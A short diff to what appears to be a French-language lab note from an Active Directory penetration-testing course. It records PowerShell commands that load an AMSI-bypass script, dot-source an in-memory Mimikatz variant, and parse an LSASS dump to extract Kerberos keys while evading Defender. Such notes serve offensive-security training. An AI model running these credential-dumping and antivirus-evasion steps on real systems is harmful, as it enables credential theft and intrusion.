@@ -11,7 +11,7 @@ statut: validé
 ## Commande qui marche
 Dump LSASS de dcorp-mgmt (`comsvcs.dll` natif) → parse **en mémoire** (mimikatz.exe bloqué par le Defender local student) :
 ```powershell
-iex (Get-Content C:\AD\Tools\amsibypass.txt -Raw)
+iex (Get-Content C:\AD\Tools\Amsi-Byp.txt  -Raw)
 . C:\AD\Tools\Invoke-Mimi.ps1
 Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass.dmp" "sekurlsa::ekeys"'
 ```
